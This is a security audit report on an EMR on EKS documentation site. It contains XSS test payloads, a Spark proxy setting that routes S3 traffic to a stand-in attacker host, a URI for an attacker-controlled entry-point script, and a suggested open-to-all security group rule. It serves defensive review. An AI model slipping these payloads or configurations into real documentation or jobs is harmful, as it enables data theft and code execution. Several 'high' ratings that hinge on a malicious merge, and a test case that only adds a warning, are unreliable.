## Combined Vulnerability List

This document outlines the combined list of identified vulnerabilities, consolidated from multiple reports and filtered to include only high and critical severity issues that are realistically exploitable and fully described.

### 1. Cross-Site Scripting (XSS) vulnerability in Markdown documentation

- **Description:** A threat actor can inject malicious Javascript code into markdown files within the repository. If a pull request containing this malicious code is merged and deployed, users visiting the documentation website will execute the injected Javascript in their browsers. The steps to trigger this vulnerability are as follows:
    1. Fork the repository.
    2. Modify a markdown file (e.g., `/code/content/index.md`) by injecting malicious Javascript code within the markdown content, such as `<script>alert("XSS Vulnerability");</script>` or `<img src="x" onerror="alert('XSS')">`.
    3. Create a pull request with these malicious changes.
    4. If a repository administrator merges the pull request without proper review and sanitization.
    5. The website is rebuilt and deployed using `mkdocs gh-deploy`.
    6. Users visiting the published documentation website will execute the injected Javascript code in their browsers.

- **Impact:** Successful XSS exploitation can have severe consequences:
    - **Data theft:** Attackers can steal sensitive information like cookies, session tokens, or user data from website visitors' browsers.
    - **Account hijacking:** User accounts can be compromised if authentication tokens are exposed or manipulated.
    - **Malware distribution:** Users can be redirected to malicious websites or have malware injected into the documentation website.
    - **Defacement:** The content of the documentation website can be modified, leading to misinformation and reputational damage.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:** None. The project lacks any automated sanitization or security checks for markdown content. While `CONTRIBUTING.md` encourages focused contributions, it does not provide technical XSS mitigation.

- **Missing Mitigations:**
    - **Content Security Policy (CSP):** Implementing a CSP header to restrict resource loading sources, significantly reducing XSS risk.
    - **Markdown Sanitization:** Integrating a markdown sanitization library into the MkDocs build process to automatically remove or neutralize malicious HTML and Javascript from markdown content.
    - **Pull Request Review Process with Security Focus:** Establishing a rigorous pull request review process that includes security considerations, specifically manual inspection for malicious content in markdown files.

- **Preconditions:**
    - An attacker must be able to create a pull request to the repository.
    - A repository administrator must merge the pull request containing malicious markdown content.
    - The documentation website must be rebuilt and deployed after merging the malicious pull request.
    - Users must visit the affected page on the live documentation website.

- **Source Code Analysis:**
    - The project utilizes MkDocs to generate the website from markdown files as configured in `mkdocs.yml`.
    - MkDocs, by default, renders markdown to HTML without sanitization, making it vulnerable to XSS if malicious code is present in markdown sources.
    - Markdown files throughout the `/code/content/` directory serve as potential injection points.
    - No code within the project indicates any markdown sanitization or CSP implementation. The project's focus is on documentation content, not inherent website security.

- **Security Test Case:**
    1. Fork the repository.
    2. Navigate to `/code/content/index.md` in your forked repository.
    3. Edit `index.md` and add `<script>alert("XSS Vulnerability");</script>` at the end of the file.
    4. Commit the changes.
    5. Create a pull request to the main repository's `main` branch.
    6. Merge the pull request.
    7. Manually trigger website deployment using `mkdocs gh-deploy` or wait for automated deployment.
    8. Access the live documentation website, specifically the index page.
    9. Verify that an alert box with "XSS Vulnerability" appears, confirming the vulnerability.


### 2. Code Injection via Malicious Spark Configuration Overrides

- **Description:** An attacker can inject malicious configurations into the `configurationOverrides` section of code examples within documentation markdown files. If users copy-paste these examples, their Spark jobs will execute with the malicious configurations. The vulnerability can be triggered by:
    1. Modifying a markdown file (e.g., `/code/content/submit-applications/docs/spark/pyspark.md`).
    2. Injecting a malicious configuration in a code block, such as altering `spark.hadoop.fs.s3.proxy.host` to redirect S3 traffic to an attacker's proxy.
    3. A user copies the modified code example.
    4. The user executes the `aws emr-containers start-job-run` command in their environment.
    5. The Spark job starts with the injected malicious configuration overrides.

- **Impact:** By controlling configuration overrides, an attacker could:
    - Redirect job logs to an attacker-controlled server by manipulating monitoring configurations.
    - Modify security settings, potentially disabling authentication or encryption.
    - Alter job behavior to exfiltrate data by manipulating Spark configurations related to data output paths or external data access.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:** None. The project provides documentation and sample code and does not prevent users from copy-pasting potentially malicious content.

- **Missing Mitigations:**
    - Implement a security review process for all documentation changes, especially code examples, to detect and prevent injection of malicious configurations.
    - Add a clear warning in the documentation advising users to carefully review and understand code examples before use, especially configurations affecting security or data handling.

- **Preconditions:**
    - An attacker needs to modify documentation files in the repository.
    - A user must copy and paste the malicious code example and execute it in their EMR on EKS environment.

- **Source Code Analysis:**
    - The vulnerability resides in the documentation content, specifically in code examples within markdown files in `/code/content/`.
    - Example vulnerable code snippet in `/code/content/submit-applications/docs/spark/pyspark.md`:
    ```json
    "configurationOverrides": {
      "applicationConfiguration": [
        {
          "classification": "spark-defaults",
          "properties": {
            "spark.hadoop.fs.s3.proxy.host": "malicious-proxy.attacker.com",
            "spark.hadoop.fs.s3.proxy.port": "8080"
           }
        }
      ],
      "monitoringConfiguration": {
        "cloudWatchMonitoringConfiguration": {
          "logGroupName": "/emr-containers/jobs",
          "logStreamNamePrefix": "demo"
        },
        "s3MonitoringConfiguration": {
          "logUri": "s3://joblogs"
        }
      }
    }
    ```
    - Copying this snippet configures Spark jobs to route S3 traffic through `malicious-proxy.attacker.com:8080`, potentially exposing data to the attacker.

- **Security Test Case:**
    1. Modify `/code/content/submit-applications/docs/spark/pyspark.md`.
    2. Inject the malicious `configurationOverrides` snippet above into a code example.
    3. Commit and push changes.
    4. As a test user, copy the modified code example.
    5. Execute the `aws emr-containers start-job-run` command against a test EMR on EKS virtual cluster.
    6. Observe Spark job execution and network traffic. Network analysis should show attempts to connect to `malicious-proxy.attacker.com:8080` when accessing S3. Monitoring logs might show S3 access errors if the proxy is not set up correctly.
    7. This confirms that malicious configurations can be injected and applied to a user's EMR on EKS environment through copy-pasting.


### 3. Code Injection via Malicious S3 URI in Examples

- **Description:** An attacker can replace legitimate S3 URIs in documentation code examples with malicious ones. Users who copy-paste these examples could inadvertently interact with attacker-controlled S3 buckets, leading to data exfiltration or execution of malicious code. Trigger steps:
    1. Modify a markdown file (e.g., `/code/tools/start-job-run-converter/README.md`).
    2. Replace a legitimate S3 URI with a malicious one, e.g., `s3://<s3 bucket>/health_violations.py` to `s3://attacker-bucket/malicious_script.py`.
    3. A user copies the modified code example.
    4. The user executes the modified script, including the `aws emr-containers start-job-run` command with the malicious S3 URI.
    5. The Spark job attempts to execute the script from the attacker-controlled S3 bucket.

- **Impact:** By controlling S3 URIs, an attacker could:
    - Trick users into running malicious scripts as their Spark job entry point.
    - Exfiltrate data by directing job outputs to an attacker-controlled S3 bucket.
    - Cause denial of service by pointing to non-existent or excessively large files in S3.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:** None. The project is documentation and sample code and doesn't inherently prevent copy-pasting malicious content.

- **Missing Mitigations:**
    - Implement a security review process for all documentation changes, especially code examples, to detect and prevent injection of malicious S3 URIs.
    - Add a clear warning in the documentation advising users to carefully review and validate S3 URIs in code examples, ensuring they point to trusted and expected locations.

- **Preconditions:**
    - An attacker needs to modify documentation files in the repository.
    - A user must copy and paste the malicious code example and execute it in their EMR on EKS environment.

- **Source Code Analysis:**
    - The vulnerability is in documentation content, specifically in code examples within markdown files in `/code/content/` and `/code/tools/`.
    - Example vulnerable code snippet in `/code/tools/start-job-run-converter/README.md`:
    ```markdown
    --job-driver '{
        "sparkSubmitJobDriver": {
            "entryPoint": "s3://<s3 bucket>/health_violations.py",
            ...
        }
    }'
    ```
    - Replacing `s3://<s3 bucket>/health_violations.py` with `s3://attacker-bucket/malicious_script.py` can trick users into executing attacker-controlled code.

- **Security Test Case:**
    1. Modify `/code/tools/start-job-run-converter/README.md`.
    2. Replace a legitimate `entryPoint` S3 URI with `s3://attacker-bucket/malicious_script.py` in a code example.
    3. Ensure `s3://attacker-bucket/malicious_script.py` contains a simple script (e.g., prints a message and exits).
    4. Commit and push changes.
    5. As a test user, copy the modified code example.
    6. Replace placeholders in the copied command with valid values for a test EMR on EKS virtual cluster.
    7. Execute the `aws emr-containers start-job-run` command.
    8. Check CloudWatch or S3 logs for the Spark job. Successful execution and logs containing output from `malicious_script.py` confirms the malicious script execution.
    9. This demonstrates that malicious S3 URIs can be injected and lead to attacker-controlled code execution through copy-pasting.


### 4. Insecure JDBC Credentials in Spark Configuration

- **Description:** An attacker can modify the documentation example in `/code/content/metastore-integrations/docs/hive-metastore.md` to embed plaintext JDBC credentials within `spark-submit` parameters. If merged, users copying this example would expose database credentials in plaintext in their Spark job configurations, accessible to anyone with access to job definitions or logs.

- **Impact:** Exposure of database credentials can lead to unauthorized access to the Hive Metastore database, potentially allowing attackers to read, modify, or delete metadata and access the underlying data lake.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:** None. The example in the documentation currently demonstrates insecure credential handling.

- **Missing Mitigations:**
    - Update documentation to strongly discourage embedding plaintext credentials in Spark configurations.
    - Recommend secure alternatives for managing database credentials, such as:
        - Using AWS Secrets Manager.
        - Using environment variables from Kubernetes secrets.
        - Emphasizing the principle of least privilege for database access.

- **Preconditions:**
    - An attacker needs to submit a pull request that is merged.
    - Users need to copy and paste the vulnerable example and use it without implementing proper credential management.

- **Source Code Analysis:**
    - File: `/code/content/metastore-integrations/docs/hive-metastore.md`
    - Vulnerable code snippet in documentation example:
    ```markdown
           "sparkSubmitParameters": "--jars s3://<s3 prefix>/mariadb-connector-java.jar --conf spark.hadoop.javax.jdo.option.ConnectionDriverName=org.mariadb.jdbc.Driver --conf spark.hadoop.javax.jdo.option.ConnectionUserName=<connection-user-name> --conf spark.hadoop.javax.jdo.option.ConnectionPassword=<connection-password> --conf spark.hadoop.javax.jdo.option.ConnectionURL=<JDBC-Connection-string> --conf spark.driver.cores=5 --conf spark.executor.memory=20G --conf spark.driver.memory=15G --conf spark.executor.cores=6"
    ```
    - `--conf spark.hadoop.javax.jdo.option.ConnectionUserName` and `--conf spark.hadoop.javax.jdo.option.ConnectionPassword` directly include placeholders for credentials, without sufficient warning against plaintext usage.

- **Security Test Case:**
    1. Fork the repository.
    2. Modify `/code/content/metastore-integrations/docs/hive-metastore.md`.
    3. In "Example 1" request, change the NOTE block to warn against plaintext credentials: "**WARNING**: Do not embed actual database credentials directly in `spark-submit` parameters. This is highly insecure and for demonstration purposes only. Always use secure methods like AWS Secrets Manager for production environments."
    4. Submit a pull request.
    5. Merging the pull request mitigates the vulnerability by adding a clear warning.
    6. Further testing could involve creating a pull request to remove the warning to demonstrate vulnerability reintroduction.


### 5. Insecure Configuration Guidance

- **Description:** An attacker can submit a malicious pull request to alter documentation, recommending insecure configurations for Amazon EMR on EKS clusters. Users following this compromised guidance may deploy clusters with weakened security postures, such as opening unnecessary ports or disabling encryption.

- **Impact:** Users following modified documentation may unknowingly deploy insecure Amazon EMR on EKS clusters, leading to:
    - Unauthorized access to cluster resources and data.
    - Data breaches due to weakened encryption or exposed services.
    - Compromise of applications running on the cluster.
    - Compliance violations due to insecure configurations.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - Pull requests for contributions requiring review by repository administrators.
    - Code of Conduct and Contributing Guidelines encouraging responsible contributions.
    - `CONTRIBUTING.md` encourages responsible disclosure of security issues via a vulnerability reporting page.

- **Missing Mitigations:**
    - No explicit security review process for pull requests, especially for configuration recommendations.
    - No automated checks to validate the security posture of recommended configurations.
    - No specific guidelines for reviewers to assess security implications of documentation changes.

- **Preconditions:**
    - An attacker needs to successfully submit and have a malicious pull request merged.
    - Repository administrators may not thoroughly review all aspects of every pull request, especially subtle changes in configuration recommendations.

- **Source Code Analysis:**
    - Vulnerability is in documentation content in Markdown format throughout `/code/content/`.
    - Attackers can modify any documentation file, e.g., `/code/content/security/docs/spark/network-security.md`, to suggest weaker security group rules.
    - Example: Modifying `/code/content/security/docs/spark/network-security.md` to advise opening a wide range of ports in Security Group examples.
    - Another example: Modifying `/code/content/security/docs/spark/encryption.md` to discourage enabling default encryption for S3 or EBS.
    - `mkdocs.yml` could be modified to misrepresent security-related documentation.

- **Security Test Case:**
    1. Fork the repository.
    2. Modify `/code/content/security/docs/spark/network-security.md`.
    3. In "Define SecurityGroupPolicy," change the example SecurityGroupPolicy to include an overly permissive rule (e.g., allow inbound from `0.0.0.0/0` on all ports).
    4. Create a pull request.
    5. If merged without detection, the live documentation will be updated with insecure guidance.
    6. Users following the documentation may create insecure `SecurityGroupPolicy`, resulting in overly permissive network access in their EMR on EKS cluster.
    7. Verify by inspecting the updated documentation on the live website after the malicious pull request is merged and deployed.
